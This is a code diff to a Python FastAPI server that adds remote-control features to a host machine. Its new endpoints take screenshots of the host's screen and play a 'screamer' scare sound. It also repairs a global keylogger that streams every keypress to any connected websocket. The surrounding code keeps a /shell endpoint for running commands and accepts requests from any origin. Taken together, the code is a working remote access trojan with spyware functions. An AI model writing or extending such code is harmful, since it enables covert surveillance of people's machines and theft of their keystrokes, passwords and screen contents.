@@ -5,10 +5,68 @@ import subprocess
 import threading
 from pynput import keyboard
 import asyncio
+from pydub import AudioSegment
+from pydub.playback import play
+from PIL import Image, ImageTk
+import tkinter as tk
+import os
+import pyautogui
+from fastapi.responses import FileResponse
+
+# --- Asset paths ---
+ASSETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets")
+SOUND_PATH = os.path.join(ASSETS_DIR, "screamer.mp3")
+IMAGE_PATH = os.path.join(ASSETS_DIR, "screamer.jpg")
+
+# --- Utility/helper functions ---
+
+def show_fullscreen_image(image_path):
+    def _show():
+        root = tk.Tk()
+        root.attributes('-fullscreen', True)
+        root.configure(background='black')
+        img = Image.open(image_path)
+        screen_width = root.winfo_screenwidth()
+        screen_height = root.winfo_screenheight()
+        img = img.resize((screen_width, screen_height), Image.ANTIALIAS)
+        tk_img = ImageTk.PhotoImage(img)
+        label = tk.Label(root, image=tk_img, bg='black')
+        label.pack(expand=True)
+        root.after(5000, root.destroy)  # Show for 5 seconds
+        root.mainloop()
+    threading.Thread(target=_show, daemon=True).start()
+
+def display_screamer():
+    song = AudioSegment.from_mp3(SOUND_PATH)
+    play(song)
+
+connected_websockets = set()
+ws_lock = threading.Lock()
+main_loop = None
+
+async def send_key_to_all(key_str):
+    with ws_lock:
+        websockets = list(connected_websockets)
+    for ws in websockets:
+        try:
+            await ws.send_text(f"Key pressed: {key_str}")
+        except Exception:
+            pass
+
+def on_press(key):
+    key_str = str(key)
+    global main_loop
+    if main_loop and main_loop.is_running():
+        asyncio.run_coroutine_threadsafe(send_key_to_all(key_str), main_loop)
+
+def start_keyboard_listener():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+# --- FastAPI app and routes ---
 
 app = FastAPI()
 
-# Allow all origins
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -17,8 +75,15 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-connected_websockets = set()
-ws_lock = threading.Lock()
+@app.on_event("startup")
+def startup_event():
+    global main_loop
+    main_loop = asyncio.get_running_loop()
+    threading.Thread(target=start_keyboard_listener, daemon=True).start()
+
+@app.get('/status')
+def status_check():
+    return {"status": "online"}
 
 @app.get("/os")
 def read_os():
@@ -27,10 +92,6 @@ def read_os():
 @app.get("/ip")
 def read_ip():
     return {"ip": get_ip()}
-
-@app.get('/system-info')
-def get_system():
-    return {"spec":get_os_spec()}
 
 @app.post("/shell")
 async def run_shell(request: Request):
@@ -61,27 +122,18 @@ async def websocket_endpoint(websocket: WebSocket):
         with ws_lock:
             connected_websockets.discard(websocket)
 
-# Helper to send key events to all websockets from a non-async thread
-async def send_key_to_all(key_str):
-    with ws_lock:
-        websockets = list(connected_websockets)
-    for ws in websockets:
-        try:
-            await ws.send_text(f"Key pressed: {key_str}")
-        except Exception:
-            pass
+@app.get('/system-info')
+def get_system():
+    return {"spec": get_os_spec()}
 
-def on_press(key):
-    key_str = str(key)
-    loop = asyncio.get_event_loop()
-    if loop.is_running():
-        asyncio.run_coroutine_threadsafe(send_key_to_all(key_str), loop)
+@app.get('/screamer')
+def trigger_screamer():
+    display_screamer()
+    return {"status": "screamer triggered"}
 
-
-def start_keyboard_listener():
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-
-@app.on_event("startup")
-def startup_event():
-    threading.Thread(target=start_keyboard_listener, daemon=True).start()
+@app.get('/screenshot')
+def screenshot():
+    screenshot_path = os.path.join(ASSETS_DIR, 'screenshot.png')
+    image = pyautogui.screenshot()
+    image.save(screenshot_path)
+    return FileResponse(screenshot_path, media_type='image/png')
